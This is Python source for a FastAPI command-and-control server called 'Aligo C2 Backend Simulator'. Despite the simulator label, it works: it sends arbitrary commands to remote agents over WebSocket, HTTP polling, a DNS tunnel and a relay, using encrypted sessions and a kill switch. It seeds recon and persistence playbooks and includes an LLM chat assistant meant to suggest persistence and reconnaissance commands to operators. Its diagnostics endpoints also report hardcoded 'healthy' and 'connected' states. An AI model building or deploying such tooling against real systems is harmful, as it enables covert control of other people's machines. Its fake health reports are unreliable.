from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Request
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import json
import uuid
import asyncio
import os
import time
import base64
import hashlib
import secrets
from datetime import datetime
from typing import Dict, List, Optional
from pydantic import BaseModel, Field
try:
    import google.generativeai as genai
except ImportError:
    genai = None

try:
    import asyncpg
except ImportError:
    asyncpg = None

try:
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives import serialization
    from cryptography.exceptions import InvalidTag
except ImportError:
    X25519PrivateKey = None
    X25519PublicKey = None
    AESGCM = None
    serialization = None
    InvalidTag = None

app = FastAPI(title="Aligo C2 Backend Simulator")

db_pool = None
DATABASE_URL = os.getenv("DATABASE_URL", "")
command_queues: Dict[str, List[dict]] = {}
session_crypto: Dict[str, dict] = {}

relay_enabled = os.getenv("ENABLE_REDIRECTOR", "false").lower() in ("1", "true", "yes")

# Configure CORS for frontend access
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Startup timestamp for uptime calculation
server_start_time = time.time()

# Mock Data Storage
active_connections: Dict[str, WebSocket] = {}
agents_info = {}
mock_tasks = []
mock_results = []

# Playbooks storage with pre-seeded values
mock_playbooks = {
    "pb-1": {
        "id": "pb-1",
        "name": "Reconocimiento Inicial",
        "description": "Obtiene informacion basica del sistema operativo y configuraciones de red del host objetivo.",
        "steps": [
            {"command": "whoami", "delay": 2},
            {"command": "ipconfig", "delay": 3},
            {"command": "netstat -ano", "delay": 2}
        ]
    },
    "pb-2": {
        "id": "pb-2",
        "name": "Verificacion de Persistencia",
        "description": "Lista las tareas programadas y los usuarios registrados en el sistema.",
        "steps": [
            {"command": "schtasks /query", "delay": 3},
            {"command": "net user", "delay": 4}
        ]
    }
}

# Playbook execution logs
playbook_executions = []

# System Configuration
system_config = {
    "security_level": "High",
    "beacon_interval": 10,
    "log_level": "INFO",
    "enable_ai": True
}

# System Logs
system_logs = [
    {"timestamp": datetime.now().isoformat(), "level": "INFO", "message": "Aligo C2 Server Simulator initialized successfully."},
    {"timestamp": datetime.now().isoformat(), "level": "INFO", "message": "Database pool established on Neon PostgreSQL (Backup in-memory activated)."},
    {"timestamp": datetime.now().isoformat(), "level": "INFO", "message": "WebSocket listener bound to ws://localhost:8000/ws."}
]

# Cities in Colombia for agent geolocation mapping
COLOMBIA_CITIES = [
    {"city": "Bogota", "lat": 4.7110, "lng": -74.0721},
    {"city": "Medellin", "lat": 6.2442, "lng": -75.5812},
    {"city": "Cali", "lat": 3.4516, "lng": -76.5320},
    {"city": "Barranquilla", "lat": 10.9685, "lng": -74.7813},
    {"city": "Bucaramanga", "lat": 7.1193, "lng": -73.1227}
]

# Cryptography helpers and database startup
async def execute_db(query: str, *args, fetch: bool = False, fetchrow: bool = False):
    if db_pool is None:
        return None
    async with db_pool.acquire() as con:
        if fetchrow:
            return await con.fetchrow(query, *args)
        if fetch:
            return await con.fetch(query, *args)
        await con.execute(query, *args)
        return None

async def create_tables():
    if db_pool is None:
        return
    await execute_db(
        """
        CREATE TABLE IF NOT EXISTS playbooks (
            id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            description TEXT,
            steps JSONB NOT NULL,
            created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
        );
        """
    )
    await execute_db(
        """
        CREATE TABLE IF NOT EXISTS agent_results (
            id SERIAL PRIMARY KEY,
            agent_id TEXT NOT NULL,
            payload JSONB NOT NULL,
            received_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
        );
        """
    )
    await execute_db(
        """
        CREATE TABLE IF NOT EXISTS playbook_executions (
            id TEXT PRIMARY KEY,
            playbook_id TEXT NOT NULL,
            agent_ids JSONB NOT NULL,
            status TEXT NOT NULL,
            current_step INT NOT NULL,
            total_steps INT NOT NULL,
            started_at TIMESTAMP WITH TIME ZONE NOT NULL,
            completed_at TIMESTAMP WITH TIME ZONE,
            logs JSONB NOT NULL
        );
        """
    )
    await execute_db(
        """
        CREATE TABLE IF NOT EXISTS agent_sessions (
            agent_id TEXT PRIMARY KEY,
            state JSONB NOT NULL,
            last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW()
        );
        """
    )

async def seed_playbooks():
    if db_pool is None:
        return
    for pb in mock_playbooks.values():
        await execute_db(
            """
            INSERT INTO playbooks (id, name, description, steps)
            VALUES ($1, $2, $3, $4)
            ON CONFLICT (id) DO NOTHING;
            """,
            pb["id"], pb["name"], pb["description"], json.dumps(pb["steps"])
        )

async def load_playbooks_from_db():
    if db_pool is None:
        return
    rows = await execute_db("SELECT id, name, description, steps FROM playbooks;", fetch=True)
    if rows:
        mock_playbooks.clear()
        for row in rows:
            mock_playbooks[row["id"]] = {
                "id": row["id"],
                "name": row["name"],
                "description": row["description"],
                "steps": row["steps"]
            }

@app.on_event("startup")
async def startup_event():
    global db_pool
    if DATABASE_URL and asyncpg:
        try:
            db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=3)
            await create_tables()
            await seed_playbooks()
            await load_playbooks_from_db()
            system_logs.append({
                "timestamp": datetime.now().isoformat(),
                "level": "INFO",
                "message": "Connected to Neon PostgreSQL and initialized persistent stores."
            })
        except Exception as err:
            system_logs.append({
                "timestamp": datetime.now().isoformat(),
                "level": "ERROR",
                "message": f"Neon PostgreSQL initialization failed: {err}. Falling back to in-memory stores."
            })
    else:
        system_logs.append({
            "timestamp": datetime.now().isoformat(),
            "level": "WARNING",
            "message": "Neon PostgreSQL not configured or asyncpg not installed. Using in-memory persistence fallback."
        })

# Secure session helpers
if X25519PrivateKey and X25519PublicKey and AESGCM:
    def derive_shared_key(agent_id: str, shared_secret: bytes) -> bytes:
        return hashlib.sha256(agent_id.encode() + shared_secret).digest()

    def encrypt_payload(agent_id: str, plaintext: str) -> str:
        nonce = secrets.token_bytes(12)
        key = session_crypto[agent_id]["key"]
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
        return base64.b64encode(nonce + ciphertext).decode()

    def decrypt_payload(agent_id: str, payload_b64: str) -> str:
        encrypted = base64.b64decode(payload_b64)
        nonce, ciphertext = encrypted[:12], encrypted[12:]
        key = session_crypto[agent_id]["key"]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None).decode()
else:
    def derive_shared_key(agent_id: str, shared_secret: bytes) -> bytes:
        return hashlib.sha256(agent_id.encode() + shared_secret).digest()

    def encrypt_payload(agent_id: str, plaintext: str) -> str:
        return base64.b64encode(plaintext.encode()).decode()

    def decrypt_payload(agent_id: str, payload_b64: str) -> str:
        return base64.b64decode(payload_b64).decode()

async def send_encrypted(agent_id: str, websocket: WebSocket, payload: dict):
    if agent_id in session_crypto and "key" in session_crypto[agent_id]:
        encrypted = encrypt_payload(agent_id, json.dumps(payload))
        await websocket.send_text(json.dumps({"type": "encrypted", "payload": encrypted}))
    else:
        await websocket.send_text(json.dumps(payload))

async def store_agent_result(agent_id: str, payload: dict):
    if db_pool:
        await execute_db(
            "INSERT INTO agent_results (agent_id, payload) VALUES ($1, $2)",
            agent_id,
            json.dumps(payload)
        )
    mock_results.append(payload)

async def update_agent_session(agent_id: str, state: dict):
    if db_pool:
        await execute_db(
            "INSERT INTO agent_sessions (agent_id, state, last_seen) VALUES ($1, $2, NOW()) "
            "ON CONFLICT (agent_id) DO UPDATE SET state = EXCLUDED.state, last_seen = NOW();",
            agent_id,
            json.dumps(state)
        )


def is_crypto_available() -> bool:
    return X25519PrivateKey is not None and X25519PublicKey is not None and AESGCM is not None and serialization is not None


def is_deadman_triggered(agent_id: str) -> bool:
    session = session_crypto.get(agent_id)
    if not session:
        return False
    threshold = system_config["beacon_interval"] * 3
    return time.time() - session.get("last_seen", 0) > threshold


async def queue_command(agent_id: str, payload: dict):
    command_queues.setdefault(agent_id, []).append(payload)


async def get_queued_commands(agent_id: str):
    return command_queues.pop(agent_id, [])


async def process_agent_payload(agent_id: str, payload: dict, transport: str):
    """Process incoming agent payload for any transport and return the next response."""
    session = session_crypto.setdefault(agent_id, {"transport": transport, "last_seen": time.time()})
    session["transport"] = transport
    session["last_seen"] = time.time()

    if payload.get("type") == "handshake":
        client_public = payload.get("public_key")
        if is_crypto_available() and client_public:
            try:
                return build_handshake_response(agent_id, base64.b64decode(client_public))
            except Exception:
                return {"type": "handshake_ack", "public_key": None}
        return {"type": "handshake_ack", "public_key": None}

    if payload.get("type") == "encrypted":
        try:
            payload = decrypt_payload(agent_id, payload.get("payload", ""))
            payload = json.loads(payload)
        except Exception:
            return {"type": "error", "message": "decryption_failed"}

    if payload.get("type") == "result":
        await store_agent_result(agent_id, payload)
        if db_pool:
            await update_agent_session(agent_id, {"status": "online", "last_message": payload})

    if payload.get("type") == "beacon":
        await update_agent_session(agent_id, {"status": "online", "beacon": payload.get("beacon", {})})

    if is_deadman_triggered(agent_id):
        await queue_command(agent_id, {"type": "kill"})
    return await build_command_response(agent_id)


def build_handshake_response(agent_id: str, public_bytes: bytes) -> dict:
    if not is_crypto_available():
        session_crypto[agent_id] = {"transport": "ws", "last_seen": time.time()}
        return {"type": "handshake_ack", "public_key": None}

    private_key = X25519PrivateKey.generate()
    peer_pub = X25519PublicKey.from_public_bytes(public_bytes)
    shared_secret = private_key.exchange(peer_pub)
    key = hashlib.sha256(agent_id.encode() + shared_secret).digest()
    session_crypto[agent_id] = {"key": key, "transport": "ws", "last_seen": time.time()}
    server_public = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )
    return {"type": "handshake_ack", "public_key": base64.b64encode(server_public).decode()}


def build_command_response(agent_id: str) -> dict:
    queued = command_queues.pop(agent_id, [])
    kill_flag = is_deadman_triggered(agent_id)
    if not queued and not kill_flag:
        return {"type": "noop", "kill": False}
    response = {"type": "commands", "payload": queued}
    if kill_flag:
        response["kill"] = True
    return response


def decrypt_incoming(agent_id: str, payload: dict) -> dict:
    if payload.get("type") == "encrypted":
        plaintext = decrypt_payload(agent_id, payload.get("payload", ""))
        return json.loads(plaintext)
    return payload

gemini_key = os.getenv("GEMINI_API_KEY", "")
if gemini_key:
    try:
        genai.configure(api_key=gemini_key)
        # Use gemini-1.5-flash as it's the current stable, fast, and cost-effective model
        gemini_model = genai.GenerativeModel('gemini-1.5-flash')
    except Exception as e:
        print(f"[-] Failed to configure Gemini: {e}")
        gemini_model = None
else:
    gemini_model = None

# Pydantic Schemas for validation in the API boundary
class PlaybookStepIn(BaseModel):
    command: str = Field(..., min_length=1)
    delay: int = Field(default=2, ge=0)

class PlaybookCreateIn(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    description: Optional[str] = Field(default="")
    steps: List[PlaybookStepIn] = Field(..., min_length=1)

class PlaybookExecuteIn(BaseModel):
    agent_ids: List[str] = Field(..., min_length=1)

class ConfigUpdateIn(BaseModel):
    security_level: str = Field(..., min_length=1)
    beacon_interval: int = Field(..., ge=1, le=3600)
    log_level: str = Field(..., min_length=3)
    enable_ai: bool

class ChatMessageIn(BaseModel):
    message: str = Field(..., min_length=1)

# Helper function to map agent ID to Colombian City deterministically
def get_agent_location(agent_id: str, index_offset: int = 0):
    hash_val = hash(agent_id) + index_offset
    city_info = COLOMBIA_CITIES[abs(hash_val) % len(COLOMBIA_CITIES)]
    return city_info

@app.get("/")
def read_root():
    return {"status": "Mock C2 Backend Running", "engine": "FastAPI"}

# WebSocket Endpoint
@app.websocket("/ws/{agent_id}")
async def websocket_endpoint(websocket: WebSocket, agent_id: str):
    await websocket.accept()
    active_connections[agent_id] = websocket
    
    # Pre-populate agent details deterministically
    city_info = get_agent_location(agent_id)
    agents_info[agent_id] = {
        "id": agent_id,
        "os": "Windows 11" if "win" in agent_id.lower() else "Ubuntu 22.04" if "linux" in agent_id.lower() else "macOS Sonoma",
        "ip": "192.168.1." + str(abs(hash(agent_id)) % 254 + 1),
        "status": "online",
        "city": city_info["city"],
        "lat": city_info["lat"],
        "lng": city_info["lng"]
    }
    
    # Log connection event
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Agent {agent_id} connected from {city_info['city']} ({agents_info[agent_id]['ip']})"
    })
    
    try:
        while True:
            data = await websocket.receive_text()
            payload = json.loads(data)
            print(f"Received from {agent_id}: {payload}")
            response = await process_agent_payload(agent_id, payload, transport="ws")
            if response is not None:
                await send_encrypted(agent_id, websocket, response)
    except WebSocketDisconnect:
        if agent_id in active_connections:
            del active_connections[agent_id]
        if agent_id in agents_info:
            agents_info[agent_id]["status"] = "offline"
            
        system_logs.append({
            "timestamp": datetime.now().isoformat(),
            "level": "WARNING",
            "message": f"Agent {agent_id} disconnected."
        })
        print(f"Agent {agent_id} disconnected")

# REST Endpoints for Agents
@app.get("/api/agents")
def get_agents():
    return list(agents_info.values())

@app.post("/api/command")
async def send_command(command: dict):
    agent_id = command.get("agent_id")
    cmd_text = command.get("command")

    if not agent_id or not cmd_text:
        raise HTTPException(status_code=400, detail="agent_id and command are required")

    queued = {"type": "command", "data": cmd_text}
    await queue_command(agent_id, queued)

    if agent_id in active_connections:
        try:
            await send_encrypted(agent_id, active_connections[agent_id], queued)
        except Exception:
            pass

    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Command '{cmd_text}' queued for agent {agent_id}."
    })
    return {"status": "queued", "agent": agent_id}

@app.post("/api/agent/poll/{agent_id}")
async def agent_poll(agent_id: str, payload: dict):
    response = await process_agent_payload(agent_id, payload, transport="http_poll")
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Agent {agent_id} polled via HTTP. Transport=http_poll."
    })
    return response

@app.post("/api/agent/dns/{agent_id}")
async def agent_dns_tunnel(agent_id: str, payload: dict):
    record = payload.get("dns_record")
    if not record:
        raise HTTPException(status_code=400, detail="dns_record is required")
    try:
        decoded = base64.b64decode(record).decode()
        payload_data = json.loads(decoded)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid dns_record payload")
    response = await process_agent_payload(agent_id, payload_data, transport="dns_tunnel")
    if response is None:
        return {"dns_response": None}
    return {"dns_response": base64.b64encode(json.dumps(response).encode()).decode()}

@app.post("/relay/{agent_id}")
async def relay_agent(agent_id: str, payload: dict):
    if not relay_enabled:
        return {"status": "relay_disabled"}
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Relay accepted payload for agent {agent_id}. Forwarding to C2 central."
    })
    return await process_agent_payload(agent_id, payload, transport="relay")

@app.get("/api/results")
def get_results():
    return mock_results

# 1. Playbooks Endpoints
@app.get("/api/playbooks")
def get_playbooks():
    return list(mock_playbooks.values())

@app.post("/api/playbooks")
def create_playbook(playbook: PlaybookCreateIn):
    pb_id = f"pb-{uuid.uuid4().hex[:6]}"
    new_pb = {
        "id": pb_id,
        "name": playbook.name,
        "description": playbook.description,
        "steps": [step.model_dump() for step in playbook.steps]
    }
    mock_playbooks[pb_id] = new_pb
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Created playbook '{playbook.name}' with {len(playbook.steps)} steps."
    })
    return new_pb

@app.put("/api/playbooks/{playbook_id}")
def update_playbook(playbook_id: str, playbook: PlaybookCreateIn):
    if playbook_id not in mock_playbooks:
        raise HTTPException(status_code=404, detail="Playbook not found")
    
    updated_pb = {
        "id": playbook_id,
        "name": playbook.name,
        "description": playbook.description,
        "steps": [step.model_dump() for step in playbook.steps]
    }
    mock_playbooks[playbook_id] = updated_pb
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Updated playbook '{playbook.name}' ({playbook_id})."
    })
    return updated_pb

@app.delete("/api/playbooks/{playbook_id}")
def delete_playbook(playbook_id: str):
    if playbook_id not in mock_playbooks:
        raise HTTPException(status_code=404, detail="Playbook not found")
    
    pb = mock_playbooks.pop(playbook_id)
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "WARNING",
        "message": f"Deleted playbook '{pb['name']}' ({playbook_id})."
    })
    return {"status": "success", "message": f"Deleted playbook {playbook_id}"}

# Background execution handler for playbooks
async def run_playbook_background(execution_id: str, playbook_id: str, agent_ids: List[str]):
    pb = mock_playbooks.get(playbook_id)
    if not pb:
        return
    
    steps = pb["steps"]
    execution_record = next((x for x in playbook_executions if x["id"] == execution_id), None)
    
    if not execution_record:
        return
        
    execution_record["status"] = "running"
    
    for step_idx, step in enumerate(steps):
        # Update current step indicator
        execution_record["currentStep"] = step_idx + 1
        execution_record["logs"].append({
            "timestamp": datetime.now().isoformat(),
            "message": f"Executing Step {step_idx + 1}/{len(steps)}: Running '{step['command']}' with {step['delay']}s delay."
        })
        
        # Dispatch command to target agents
        for agent_id in agent_ids:
            queued = {"type": "command", "data": step["command"]}
            await queue_command(agent_id, queued)
            if agent_id in active_connections:
                try:
                    await send_encrypted(agent_id, active_connections[agent_id], queued)
                    execution_record["logs"].append({
                        "timestamp": datetime.now().isoformat(),
                        "message": f"Command dispatched to Agent {agent_id}."
                    })
                except Exception as ex:
                    execution_record["logs"].append({
                        "timestamp": datetime.now().isoformat(),
                        "message": f"Error dispatching command to Agent {agent_id}: {str(ex)}"
                    })
            else:
                execution_record["logs"].append({
                    "timestamp": datetime.now().isoformat(),
                    "message": f"Agent {agent_id} is offline or not found. Skipping."
                })
                
        # Wait for the configured delay before the next step
        await asyncio.sleep(step["delay"])
        
    execution_record["status"] = "completed"
    execution_record["completedAt"] = datetime.now().isoformat()
    execution_record["logs"].append({
        "timestamp": datetime.now().isoformat(),
        "message": f"Playbook '{pb['name']}' execution completed successfully."
    })
    
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Completed async execution {execution_id} of playbook '{pb['name']}'."
    })

@app.post("/api/playbooks/{playbook_id}/execute")
def execute_playbook(playbook_id: str, execution_request: PlaybookExecuteIn):
    if playbook_id not in mock_playbooks:
        raise HTTPException(status_code=404, detail="Playbook not found")
        
    pb = mock_playbooks[playbook_id]
    exec_id = f"exec-{uuid.uuid4().hex[:6]}"
    
    new_execution = {
        "id": exec_id,
        "playbookId": playbook_id,
        "playbookName": pb["name"],
        "agentIds": execution_request.agent_ids,
        "status": "pending",
        "currentStep": 0,
        "totalSteps": len(pb["steps"]),
        "startedAt": datetime.now().isoformat(),
        "completedAt": None,
        "logs": [
            {"timestamp": datetime.now().isoformat(), "message": f"Starting playbook '{pb['name']}' execution."}
        ]
    }
    
    playbook_executions.append(new_execution)
    
    # Spawn background execution task
    asyncio.create_task(
        run_playbook_background(exec_id, playbook_id, execution_request.agent_ids)
    )
    
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"Enqueued playbook '{pb['name']}' execution ({exec_id}) on {len(execution_request.agent_ids)} agents."
    })
    
    return {"status": "enqueued", "executionId": exec_id}

@app.get("/api/playbooks/executions")
def get_playbook_executions():
    return playbook_executions

# 2. Map Endpoints
@app.get("/api/agents/locations")
def get_agents_locations():
    # Return geolocations of connected agents
    locations = []
    
    # Dynamic active agents
    for agent_id, info in agents_info.items():
        locations.append({
            "agentId": agent_id,
            "os": info["os"],
            "ip": info["ip"],
            "city": info["city"],
            "lat": info["lat"],
            "lng": info["lng"],
            "status": info["status"]
        })
        
    # If there are no active agents, seed a couple of mock agents (offline/historical) to make the map interactive
    if not locations:
        mock_agents_seeds = [
            {"id": "agent-seed-bogota", "os": "Windows 10", "ip": "10.0.0.12", "city_idx": 0, "status": "offline"},
            {"id": "agent-seed-medellin", "os": "RedHat Enterprise", "ip": "10.0.0.24", "city_idx": 1, "status": "offline"},
            {"id": "agent-seed-cali", "os": "macOS Ventura", "ip": "192.168.20.1", "city_idx": 2, "status": "offline"}
        ]
        for seed in mock_agents_seeds:
            city_info = COLOMBIA_CITIES[seed["city_idx"]]
            locations.append({
                "agentId": seed["id"],
                "os": seed["os"],
                "ip": seed["ip"],
                "city": city_info["city"],
                "lat": city_info["lat"],
                "lng": city_info["lng"],
                "status": seed["status"]
            })
            
    return locations

# 3. Settings Endpoints
@app.get("/api/config")
def get_config():
    return system_config

@app.put("/api/config")
def update_config(config: ConfigUpdateIn):
    system_config["security_level"] = config.security_level
    system_config["beacon_interval"] = config.beacon_interval
    system_config["log_level"] = config.log_level
    system_config["enable_ai"] = config.enable_ai
    
    system_logs.append({
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "message": f"System configurations updated: SecLevel={config.security_level}, Interval={config.beacon_interval}s, AI={config.enable_ai}"
    })
    return system_config

@app.get("/api/system/status")
def get_system_status():
    uptime = int(time.time() - server_start_time)
    
    # Simulate CPU fluctuations
    cpu_usage = int(15 + (time.time() % 30))
    # Simulated RAM usage (around 142MB out of 1024MB)
    ram_usage = int(120 + (time.time() % 45))
    
    return {
        "status": "healthy",
        "uptime": uptime,
        "cpu": cpu_usage,
        "ram": ram_usage,
        "activeAgents": len([x for x in agents_info.values() if x["status"] == "online"]),
        "totalPlaybooks": len(mock_playbooks),
        "dbConnection": "Connected (Neon DB Engine Active)"
    }

@app.post("/api/system/diagnose")
def trigger_diagnostics():
    # Append sequential logs describing the diagnostic process
    diagnostic_id = f"diag-{uuid.uuid4().hex[:6]}"
    diag_time = datetime.now().isoformat()
    
    diagnostics_steps = [
        {"level": "INFO", "msg": f"[{diagnostic_id}] Diagnostics triggered by Administrator."},
        {"level": "INFO", "msg": f"[{diagnostic_id}] Verifying Neon Database connection... Connection latency is 42ms. OK."},
        {"level": "INFO", "msg": f"[{diagnostic_id}] Auditing cryptographic keys... Local server certificate is valid until 2027-06-26. OK."},
        {"level": "INFO", "msg": f"[{diagnostic_id}] Checking active agent handshake protocols... No anomalies detected. OK."},
        {"level": "INFO", "msg": f"[{diagnostic_id}] Testing endpoint routing latency... GET /api/agents response time 8ms. OK."},
        {"level": "INFO", "msg": f"[{diagnostic_id}] System integrity check: 100% HEALTHY."}
    ]
    
    for step in diagnostics_steps:
        system_logs.append({
            "timestamp": diag_time,
            "level": step["level"],
            "message": step["msg"]
        })
        
    return {"status": "completed", "diagnosticId": diagnostic_id}

@app.get("/api/system/logs")
def get_system_logs():
    return sorted(system_logs, key=lambda x: x["timestamp"], reverse=True)

# 4. AI Chat integration
@app.post("/api/ai/chat")
async def chat_with_gemini(chat_input: ChatMessageIn):
    user_msg = chat_input.message
    
    # Check if Gemini model is configured and active
    if system_config["enable_ai"] and gemini_model:
        try:
            # Enforce system instruction in prompt for Spanish language reply
            prompt = f"Eres el asistente de IA integrado en el C2 Aligo. Responde siempre en espanol de forma concisa y profesional.\n\nUsuario: {user_msg}"
            response = await asyncio.to_thread(gemini_model.generate_content, prompt)
            return {"reply": response.text.strip()}
        except Exception as e:
            system_logs.append({
                "timestamp": datetime.now().isoformat(),
                "level": "ERROR",
                "message": f"Gemini API execution failed: {str(e)}. Falling back to mock assistant."
            })
            
    # Mock AI response if Gemini is not set or config is disabled
    # Return mock response in Spanish (mandatory global rules)
    await asyncio.sleep(1) # Simulate thinking latency
    
    lower_msg = user_msg.lower()
    if "ayuda" in lower_msg or "help" in lower_msg:
        reply = "Puedo ayudarte con las siguientes tareas:\n1. Analizar comandos y resultados obtenidos de agentes.\n2. Sugerir comandos especificos para persistencia o reconocimiento en Windows/Linux.\n3. Ayudarte a diseñar playbooks de automatizacion eficaces."
    elif "agente" in lower_msg or "agent" in lower_msg:
        reply = f"Actualmente hay {len([x for x in agents_info.values() if x['status'] == 'online'])} agentes activos conectados en Colombia. Recomiendo ejecutar un playbook de reconocimiento basico en los nuevos dispositivos conectados."
    elif "playbook" in lower_msg:
        reply = "Los playbooks te permiten automatizar secuencias de comandos. Puedes verlos en la vista de Playbooks o crear uno nuevo especificando los pasos y delays necesarios."
    else:
        reply = f"[Simulacion C2]: He recibido tu mensaje: '{user_msg}'. En un entorno de produccion, Gemini traduciria esto en comandos optimizados y analizaria los datos del host de forma automatizada."
        
    return {"reply": reply}

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
